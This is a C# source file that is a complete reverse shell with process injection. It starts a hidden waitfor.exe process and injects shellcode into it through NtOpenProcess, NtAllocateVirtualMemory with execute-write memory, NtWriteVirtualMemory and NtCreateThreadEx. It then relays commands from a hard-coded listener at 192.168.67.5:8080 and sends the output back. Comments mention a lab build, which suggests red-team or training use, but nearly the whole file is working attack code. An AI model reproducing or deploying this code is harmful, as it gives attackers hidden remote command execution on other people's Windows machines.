using System;
using System.Security;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Runtime.ConstrainedExecution;
using System.Management;
using System.Security.Principal;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;

public class Code
{
    const int PROCESS_CREATE_THREAD = 0x0002;
    const int PROCESS_QUERY_INFORMATION = 0x0400;
    const int PROCESS_VM_OPERATION = 0x0008;
    const int PROCESS_VM_WRITE = 0x0020;
    const int PROCESS_VM_READ = 0x0010;
    const uint MEM_COMMIT = 0x00001000;
    const uint MEM_RESERVE = 0x00002000;
    const uint PAGE_READWRITE = 4;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    public const uint GENERIC_ALL = 0x1FFFFF;

    public static TcpClient tcpClient;
    public static NetworkStream stream;
    public static StreamReader streamReader;
    public static StreamWriter streamWriter;
    public static StringBuilder UserInput;

    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_ATTRIBUTES
    {
        public ulong Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public ulong Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }

    public struct CLIENT_ID
    {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }

    public enum NTSTATUS : uint
    {
        Success = 0x00000000,
        Error = 0xc0000000,
        MaximumNtStatus = 0xffffffff
    }

    [Flags]
    public enum ProcessAccessFlags : uint
    {
        All = 0x001F0FFF,
        Terminate = 0x00000001,
        CreateThread = 0x00000002,
        VirtualMemoryOperation = 0x00000008,
        VirtualMemoryRead = 0x00000010,
        VirtualMemoryWrite = 0x00000020,
        DuplicateHandle = 0x00000040,
        CreateProcess = 0x000000080,
        SetQuota = 0x00000100,
        SetInformation = 0x00000200,
        QueryInformation = 0x00000400,
        QueryLimitedInformation = 0x00001000,
        Synchronize = 0x00100000
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct OSVERSIONINFOEXW
    {
        public int dwOSVersionInfoSize;
        public int dwMajorVersion;
        public int dwMinorVersion;
        public int dwBuildNumber;
        public int dwPlatformId;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
        public string szCSDVersion;
        public UInt16 wServicePackMajor;
        public UInt16 wServicePackMinor;
        public UInt16 wSuiteMask;
        public byte wProductType;
        public byte wReserved;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LARGE_INTEGER
    {
        public UInt32 LowPart;
        public UInt32 HighPart;
    }

    // --- Standard, OS-Agnostic P/Invoke Declarations ---

    [DllImport("kernel32.dll", SetLastError = true)]
    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    [SuppressUnmanagedCodeSecurity]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool CloseHandle(IntPtr hObject);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern NTSTATUS NtOpenProcess(
        ref IntPtr ProcessHandle,
        ProcessAccessFlags DesiredAccess,
        OBJECT_ATTRIBUTES ObjectAttributes,
        ref CLIENT_ID ClientId);

    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern NTSTATUS NtAllocateVirtualMemory(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        IntPtr ZeroBits,
        ref UIntPtr RegionSize,
        uint AllocationType,
        uint Protect);

    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern NTSTATUS NtWriteVirtualMemory(
        IntPtr ProcessHandle,
        IntPtr BaseAddress,
        IntPtr Buffer,
        uint NumberOfBytesToWrite,
        ref IntPtr NumberOfBytesWritten);

    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern NTSTATUS NtCreateThreadEx(
        out IntPtr ThreadHandle,
        uint DesiredAccess,
        IntPtr ObjectAttributes,
        IntPtr ProcessHandle,
        IntPtr StartAddress,
        IntPtr Parameter,
        int CreateSuspended,
        uint StackZeroBits,
        uint SizeOfStackCommit,
        uint SizeOfStackReserve,
        IntPtr BytesBuffer);


    public static void Program()
    {
        // Custom NASM Compiled position-independent array
        byte[] scode = new byte[] {
            0x55, 0x48, 0x89, 0xe5, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x83, 0xec, 0x30,
            0x48, 0x31, 0xdb, 0x65, 0x48, 0x8b, 0x1c, 0x25, 0x60, 0x00, 0x00, 0x00,
            0x48, 0x8b, 0x5b, 0x18, 0x48, 0x8b, 0x5b, 0x20, 0x48, 0x8b, 0x1b, 0x48,
            0x8b, 0x1b, 0x4c, 0x8b, 0x43, 0x20, 0x41, 0x8b, 0x58, 0x3c, 0x4c, 0x01,
            0xc3, 0x8b, 0x83, 0x88, 0x00, 0x00, 0x00, 0x4c, 0x01, 0xc0, 0x44, 0x8b,
            0x48, 0x20, 0x4d, 0x01, 0xc1, 0x44, 0x8b, 0x50, 0x24, 0x4d, 0x01, 0xc2,
            0x44, 0x8b, 0x58, 0x1c, 0x4d, 0x01, 0xc3, 0x48, 0x31, 0xc9, 0x41, 0x8b,
            0x14, 0x89, 0x4c, 0x01, 0xc2, 0x48, 0x8b, 0x02, 0x48, 0xbb, 0x57, 0x69,
            0x6e, 0x45, 0x78, 0x65, 0x63, 0x00, 0x48, 0x39, 0xd8, 0x74, 0x05, 0x48,
            0xff, 0xc1, 0xeb, 0xe2, 0x48, 0x31, 0xd2, 0x66, 0x41, 0x8b, 0x14, 0x4a,
            0x41, 0x8b, 0x04, 0x93, 0x4c, 0x01, 0xc0, 0x48, 0x31, 0xd2, 0x52, 0x48,
            0xba, 0x63, 0x6d, 0x64, 0x2e, 0x65, 0x78, 0x65, 0x00, 0x52, 0x48, 0x89,
            0xe1, 0xba, 0x01, 0x00, 0x00, 0x00, 0xff, 0xd0, 0x48, 0x89, 0xec, 0x5d,
            0xc3
        };

        string IP = "192.168.67.5"; // Replace with listener IP during tracking execution
        int port = 8080;
        tcpClient = new TcpClient();
        UserInput = new StringBuilder();

        if (!tcpClient.Connected)
        {
            try
            {
                tcpClient.Connect(IP, port);
                stream = tcpClient.GetStream();
                streamReader = new StreamReader(stream, System.Text.Encoding.Default);
                streamWriter = new StreamWriter(stream, System.Text.Encoding.Default);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Network sink down: {ex.Message}");
                return;
            }

            Process ShellProcess;
            ShellProcess = new Process();
            ShellProcess.StartInfo.FileName = "C:\\Windows\\System32\\waitfor.exe";
            ShellProcess.StartInfo.Arguments = "/T 99999 signal";
            ShellProcess.StartInfo.CreateNoWindow = true;
            ShellProcess.StartInfo.UseShellExecute = false;
            ShellProcess.StartInfo.RedirectStandardInput = true;
            ShellProcess.StartInfo.RedirectStandardOutput = true;
            ShellProcess.StartInfo.RedirectStandardError = true;
            ShellProcess.OutputDataReceived += new DataReceivedEventHandler(SortOutputHandler);
            ShellProcess.ErrorDataReceived += new DataReceivedEventHandler(SortOutputHandler);
            ShellProcess.Start();
            System.Threading.Thread.Sleep(1000);
            string procName = "waitfor";

            int ProcId = FindUserPID(procName);
            CLIENT_ID clientid = new CLIENT_ID();
            clientid.UniqueProcess = new IntPtr(ProcId);
            clientid.UniqueThread = IntPtr.Zero;
            IntPtr byteWritten = IntPtr.Zero;
            IntPtr procHandle = IntPtr.Zero;

            NtOpenProcess(ref procHandle, ProcessAccessFlags.All, new OBJECT_ATTRIBUTES(), ref clientid);

            IntPtr allocMemAddress = new IntPtr();
            UIntPtr scodeSize = (UIntPtr)(UInt32)scode.Length;

            NtAllocateVirtualMemory(procHandle, ref allocMemAddress, IntPtr.Zero, ref scodeSize, (uint)(MEM_COMMIT | MEM_RESERVE), (uint)PAGE_EXECUTE_READWRITE);

            IntPtr unmanagedPointer = Marshal.AllocHGlobal(scode.Length);
            Marshal.Copy(scode, 0, unmanagedPointer, scode.Length);

            NtWriteVirtualMemory(procHandle, allocMemAddress, unmanagedPointer, (UInt32)(scode.Length), ref byteWritten);
            Marshal.FreeHGlobal(unmanagedPointer);

            IntPtr hRemoteThread;
            NtCreateThreadEx(out hRemoteThread, GENERIC_ALL, IntPtr.Zero, procHandle, allocMemAddress, IntPtr.Zero, 0, 0, 0, 0, IntPtr.Zero);

            CloseHandle(hRemoteThread);
            CloseHandle(procHandle);

            ShellProcess.BeginOutputReadLine();
            ShellProcess.BeginErrorReadLine();

            while (true)
            {
                try
                {
                    UserInput.Append(streamReader.ReadLine());
                    ShellProcess.StandardInput.WriteLine(UserInput);
                    UserInput.Remove(0, UserInput.Length);
                }
                catch (Exception)
                {
                    streamReader.Close();
                    streamWriter.Close();
                    ShellProcess.Kill();
                    break;
                }
            }
        }
    }

#pragma warning disable CA1416 // Suppress platform compatibility warning for lab build
    private static string GetProcessUser(Process process)
    {
        IntPtr processHandle = IntPtr.Zero;
        try
        {
            OpenProcessToken(process.Handle, 8, out processHandle);
            WindowsIdentity wi = new WindowsIdentity(processHandle);
            string user = wi.Name;
            return user.Contains(@"\") ? user.Substring(user.IndexOf(@"\") + 1) : user;
        }
        catch
        {
            return null;
        }
        finally
        {
            if (processHandle != IntPtr.Zero)
            {
                CloseHandle(processHandle);
            }
        }
    }
 #pragma warning restore CA1416
    public static int FindUserPID(string procName)
    {
        string owner;
        Process proc;
        int foundPID = 0;
        Process[] processList = Process.GetProcesses();
        foreach (Process process in processList)
        {
            if (process.ProcessName == procName)
            {
                proc = Process.GetProcessById(process.Id);
                owner = GetProcessUser(proc);
                if (owner == Environment.UserName)
                {
                    foundPID = process.Id;
                    break;
                }
            }
        }
        return foundPID;
    }

    public static void SortOutputHandler(object sendingProcess, DataReceivedEventArgs outLine)
    {
        StringBuilder strOutput = new StringBuilder();
        if (!String.IsNullOrEmpty(outLine.Data))
        {
            try
            {
                strOutput.Append(outLine.Data);
                streamWriter.WriteLine(strOutput);
                streamWriter.Flush();
            }
            catch (Exception) { }
        }
    }

    public static void Main(string[] args)
    {
        Program();
    }
}